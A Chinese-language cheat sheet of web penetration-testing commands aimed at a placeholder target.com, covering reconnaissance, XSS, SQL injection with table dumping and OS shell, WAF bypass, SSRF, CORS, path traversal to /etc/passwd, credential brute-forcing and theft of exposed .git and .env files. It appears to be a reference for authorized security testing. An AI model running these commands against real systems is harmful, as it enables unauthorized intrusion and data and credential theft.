# 工具命令速查

> **法律声明**: 本文档仅供授权安全测试使用。所有工具必须在获得目标系统明确书面授权后方可使用。未经授权使用属于违法行为。

---

## 一、子域名发现

```bash
# Subfinder (被动)
subfinder -d target.com -silent | tee subs.txt

# Subfinder (主动)
subfinder -d target.com -silent -all | tee subs-all.txt

# Amass (被动)
amass enum -passive -d target.com -o amass-subs.txt

# Amass (全面)
amass enum -active -d target.com -config config.ini -o amass-all.txt

# Assetfinder
assetfinder --subs-only target.com | tee asset-subs.txt

# Findomain
findomain -t target.com -u findomain-subs.txt

# 组合所有结果并去重
cat subs.txt amass-subs.txt asset-subs.txt | sort -u | tee all-subs.txt

# crt.sh (证书透明度)
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u

# 通过搜索引擎
curl -s "https://www.google.com/search?q=site:*.target.com" -H "User-Agent: Mozilla/5.0"
```

---

## 二、子域名存活检测

```bash
# httpx 基础
cat subs.txt | httpx -silent | tee alive.txt

# httpx 详细信息
cat subs.txt | httpx -title -tech-detect -status-code -content-length -silent | tee alive-detail.txt

# httpx 指定端口
cat subs.txt | httpx -ports 80,443,8080,8443,3000,5000,8000,9000 -silent

# httpx 截图
cat subs.txt | httpx -screenshot -silent

# httpx 探Path
cat subs.txt | httpx -path "/admin,/api,/login" -silent

# httprobe
cat subs.txt | httprobe -c 50 -t 3000 | tee alive-probe.txt
```

---

## 三、历史URL收集

```bash
# gau (获取所有历史URL)
gau target.com | tee gau-urls.txt

# gau 带黑名单
gau target.com --blacklist png,jpg,gif,css,js,woff,svg | tee gau-urls-clean.txt

# waybackurls
waybackurls target.com | tee wayback-urls.txt

# katana (从多种源)
katana -u https://target.com -silent -o katana-urls.txt

# katana 深度爬取
katana -u https://target.com -d 3 -silent -o katana-deep.txt

# 合并所有历史URL
cat gau-urls.txt wayback-urls.txt | sort -u | tee all-urls.txt

# 提取有参数的URL
cat all-urls.txt | grep -E '\?[a-z]+=' | tee param-urls.txt

# 提取JS文件
cat all-urls.txt | grep -E '\.js$' | sort -u | tee js-files.txt

# 提取JSON端点
cat all-urls.txt | grep -E '\.json$' | sort -u | tee json-endpoints.txt

# 提取API路径
cat all-urls.txt | grep -iE '/api/|/v1/|/v2/|/graphql' | sort -u | tee api-paths.txt
```

---

## 四、JS分析

```bash
# 从JS中提取URL/API
cat js-files.txt | while read url; do echo "=== $url ==="; curl -s "$url" | grep -oP 'https?://[^"'"'"' ]+' | sort -u; done

# 使用LinkFinder
python3 LinkFinder.py -i https://target.com/app.js -o cli

# JSUtilda (自动提取API)
cat js-files.txt | python3 jsutilda.py

# 从JS提取敏感信息
cat js-files.txt | while read url; do
  curl -s "$url" | grep -iE '(api_key|apikey|secret|token|password|access_key|aws_secret|sk_live|pk_live)'
done

# JSSource.com (在线服务)
curl -s "https://jssource.com/api/v1/crawl?url=https://target.com"
```

---

## 五、XSS扫描

```bash
# Dalfox (从文件)
cat urls.txt | dalfox pipe | tee dalfox-results.txt

# Dalfox (单个URL)
dalfox url https://target.com/search?q=test

# Dalfox (挖掘模式)
dalfox url https://target.com --mining-dom --mining-dict --found-action="./found.sh"

# Dalfox (自定义payload)
dalfox url https://target.com -p '"><img src=x onerror=alert(1)>'

# XSStrike (深度)
python3 xsstrike.py -u "https://target.com/search?q=test" --params

# XSStrike (爬取模式)
python3 xsstrike.py -u "https://target.com" --crawl

# Freya
python3 freya.py -u "https://target.com/search?q=1" -p 1

# 批量XSS (自定义)
cat param-urls.txt | while read url; do
  echo "[*] Testing: $url"
  curl -s -o /dev/null -w "%{http_code}" "$url"
done
```

---

## 六、参数发现

```bash
# Arjun (单个URL)
arjun -u https://target.com/api/endpoint --get

# Arjun POST方式
arjun -u https://target.com/api/endpoint -m POST

# Arjun 自定义Headers
arjun -u https://target.com/api -headers "X-Forwarded-For: 127.0.0.1"

# Arjun 指定字典
arjun -u https://target.com/api -w /path/to/wordlist.txt

# ParamSpider
python3 paramspider.py --domain target.com --exclude png,jpg,gif,css,js

# x8 (高性能参数发现)
x8 -u "https://target.com/api/FUZZ" -w params.txt
```

---

## 七、Nuclei 模板检测

```bash
# CVE漏洞检测
nuclei -t cves/ -u target.com

# 所有模板
nuclei -u target.com -o nuclei-results.txt

# 指定分类
nuclei -u target.com -t exposures/ -t misconfigurations/ -t takeovers/

# 严重级别筛选
nuclei -u target.com -severity critical,high

# 速率限制
nuclei -u target.com -rate-limit 50 -timeout 5

# 批量
cat alive.txt | nuclei -t cves/ -o batch-nuclei.txt

# 新模板通知
nuclei -update-templates
```

---

## 八、SQL注入

```bash
# sqlmap 基础
sqlmap -u "https://target.com/page?id=1" --batch

# sqlmap 带cookie
sqlmap -u "https://target.com/page?id=1" --cookie="session=xxx" --batch

# sqlmap POST数据
sqlmap -u "https://target.com/login" --data="user=admin&pass=admin" --batch

# sqlmap 请求文件
sqlmap -r request.txt --batch

# sqlmap 获取数据库
sqlmap -u "https://target.com/page?id=1" --dbs --batch

# sqlmap 获取表
sqlmap -u "https://target.com/page?id=1" -D database --tables --batch

# sqlmap 获取列
sqlmap -u "https://target.com/page?id=1" -D database -T users --columns --batch

# sqlmap 获取数据
sqlmap -u "https://target.com/page?id=1" -D database -T users --dump --batch

# sqlmap Shell
sqlmap -u "https://target.com/page?id=1" --os-shell --batch

# sqlmap 代理
sqlmap -u "https://target.com/page?id=1" --proxy="http://127.0.0.1:8080" --batch

# sqlmap 绕过WAF
sqlmap -u "https://target.com/page?id=1" --tamper=space2comment --batch
sqlmap -u "https://target.com/page?id=1" --tamper=between --batch
sqlmap -u "https://target.com/page?id=1" --tamper=base64encode --batch
sqlmap -u "https://target.com/page?id=1" --random-agent --batch

# NoSQLMap (MongoDB)
python nosqlmap.py -u "https://target.com/api?user=admin&pass=admin"
```

---

## 九、目录/文件爆破

```bash
# ffuf 基础
ffuf -u https://target.com/FUZZ -w /path/to/wordlist.txt

# ffuf 扩展名
ffuf -u https://target.com/FUZZ -w wordlist.txt -e .php,.asp,.aspx,.jsp,.txt,.json

# ffuf 过滤大小
ffuf -u https://target.com/FUZZ -w wordlist.txt -fs 1234

# ffuf 过滤状态码
ffuf -u https://target.com/FUZZ -w wordlist.txt -fc 403,404

# ffuf 递归
ffuf -u https://target.com/FUZZ -w wordlist.txt -recursion -recursion-depth 3

# ffuf 带Headers
ffuf -u https://target.com/FUZZ -w wordlist.txt -H "X-Forwarded-For: 127.0.0.1"

# ffuf POST
ffuf -u https://target.com/login -X POST -d 'user=FUZZ&pass=FUZZ' -H "Content-Type: application/x-www-form-urlencoded" -w users.txt:USER -w passwords.txt:PASS -mode clusterbomb

# Dirsearch
python3 dirsearch.py -u https://target.com -e php,txt,json -t 50

# Gobuster
gobuster dir -u https://target.com -w wordlist.txt -t 50
gobuster dns -d target.com -w subdomains.txt -t 50
```

---

## 十、SSRF探测

```bash
# 基础探测
curl -s "https://target.com/fetch?url=http://127.0.0.1:80"
curl -s "https://target.com/fetch?url=http://127.0.0.1:8080"
curl -s "https://target.com/fetch?url=http://127.0.0.1:3306"

# 带外检测 (使用 Burp Collaborator)
curl -s "https://target.com/fetch?url=http://YOUR-BURP-COLLABORATOR.oastify.com"

# Gopherus (生成gopher payload)
python3 gopherus.py --exploit mysql
python3 gopherus.py --exploit redis

# SSRFmap
python3 ssrfmap.py -r request.txt -p "url" --params
```

---

## 十一、CORS/预检请求

```bash
# 自定义Origin测试
curl -s -H "Origin: https://evil.com" -I "https://target.com/api" | grep -i "Access-Control-"

# CORS扫描 (Porch-Pirate)
python3 porch-pirate.py -u "https://target.com" scan

# Corsy
python3 corsy.py -u "https://target.com"

# ACSTIS (自动化CORS扫描)
dotnet acstis.dll -u "https://target.com"
```

---

## 十二、主机发现/端口扫描

```bash
# naabu (快速端口扫描)
naabu -host target.com -top-ports 1000 | tee ports.txt

# naabu 全端口
naabu -host target.com -p - | tee all-ports.txt

# naabu + httpx 管道
naabu -host target.com -top-ports 1000 -silent | httpx -silent | tee alive-ports.txt

# masscan (极速)
sudo masscan -p1-65535 --rate=1000 -oG masscan.txt target.com

# RustScan (快速)
rustscan -a target.com -t 2000 -b 1500 -- -A -sC
```

---

## 十三、技术指纹识别

```bash
# WhatWeb
whatweb https://target.com -v

# Wappalyzer (CLI)
wappalyzer https://target.com

# WAF识别
wafw00f https://target.com

# 自定义CURL探测
curl -s -I https://target.com | grep -iE 'server|x-powered|x-aspnet|x-generator'
```

---

## 十四、Git信息泄露

```bash
# GitDumper
python3 git_dumper.py https://target.com/.git/ ./git-dump/

# GitTools (dumper + extractor)
git clone https://github.com/internetwache/GitTools.git
python3 GitTools/Dumper/gitdumper.sh https://target.com/.git/ ./git/
python3 GitTools/Extractor/extractor.sh ./git/ ./git-extract/

# 文件检测
curl -s https://target.com/.git/config | head -20
curl -s https://target.com/.git/HEAD
curl -s https://target.com/.env
curl -s https://target.com/.gitignore
curl -s https://target.com/.DS_Store
```

---

## 十五、云存储/桶

```bash
# S3Scanner
python3 s3scanner.py target.com

# AWSBucketDump
python3 awsbuckets.py -l company-names.txt

# 自定义检测
curl -s https://target-bucket.s3.amazonaws.com
curl -s https://target-bucket.s3.us-east-1.amazonaws.com
curl -s https://storage.googleapis.com/target-bucket
curl -s https://target-bucket.storage.googleapis.com

# 阿里OSS
curl -s https://target-bucket.oss-cn-hangzhou.aliyuncs.com
```

---

## 十六、自动化流水线

```bash
# 完整子域名到存活到扫描
target="target.com"

echo "[+] 子域名收集"
subfinder -d $target -silent | tee subs-$target.txt

echo "[+] 存活检测"
cat subs-$target.txt | httpx -silent | tee alive-$target.txt

echo "[+] 历史URL收集"
gau $target | tee urls-$target.txt

echo "[+] 提取JS"
cat urls-$target.txt | grep -E '\.js$' | sort -u | tee js-$target.txt

echo "[+] 提取API端点"
cat urls-$target.txt | grep -iE '/api/|/v1/|/v2/' | sort -u | tee api-$target.txt

echo "[+] Nuclei基础扫描"
cat alive-$target.txt | nuclei -t cves/ -severity critical,high -o nuclei-critical-$target.txt

echo "[+] 参数发现"
cat alive-$target.txt | while read url; do
  arjun -u "$url" --get -oJ arjun-$target.json 2>/dev/null
done

echo "[+] XSS扫描"
cat urls-$target.txt | grep "=" | dalfox pipe -o dalfox-$target.txt 2>/dev/null

echo "[+] 完成! 结果保存在扫描文件中"
```

---

## 十七、实用单行命令

```bash
# 一键取所有子域名并检测存活
subfinder -d target.com -silent | httpx -silent

# 取历史URL并过滤JS
gau target.com | grep -E '\.js$' | sort -u

# 从URL批量取状态码
cat urls.txt | while read u; do echo "$(curl -s -o /dev/null -w %{http_code}) $u"; done

# 快速CORS检测
curl -s -D- -H "Origin: https://evil.com" -H "Host: target.com" https://target.com/ 2>/dev/null | grep -i 'access-control'

# 批量HOST头检测
curl -s -H "Host: admin.target.com" https://target.com/ -o /dev/null -w "%{http_code}\n"

# 批量URL编码检测
curl -s "https://target.com/%2e%2e%2fadmin" -o /dev/null -w "%{http_code}\n"

# 目录遍历检测
curl -s "https://target.com/../etc/passwd" | head -5
curl -s "https://target.com/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | head -5

# 检测404/403页面差异（帮助发现隐藏功能）
curl -s https://target.com/nonexistent | wc -c
curl -s https://target.com/existing | wc -c

# SSL证书信息
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -subject -dates -ext subjectAltName
```

---

## 十八、常用Wordlist路径

```bash
# SecLists
/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
/usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
/usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt
/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
/usr/share/wordlists/seclists/Fuzzing/parameters.txt

# 自定义常用路径
admin/
api/
v1/
v2/
graphql
swagger.json
api-docs
.env
.git/
s3/
backup/
test/
dev/
staging/
internal/
upload/
download/
```

---

> **心法**: 工具是死的人是活的。核心流程是"发现→枚举→检测→深入"四步循环。不要迷恋工具自动化，手动分析往往能找到自动化工具漏掉的关键点。
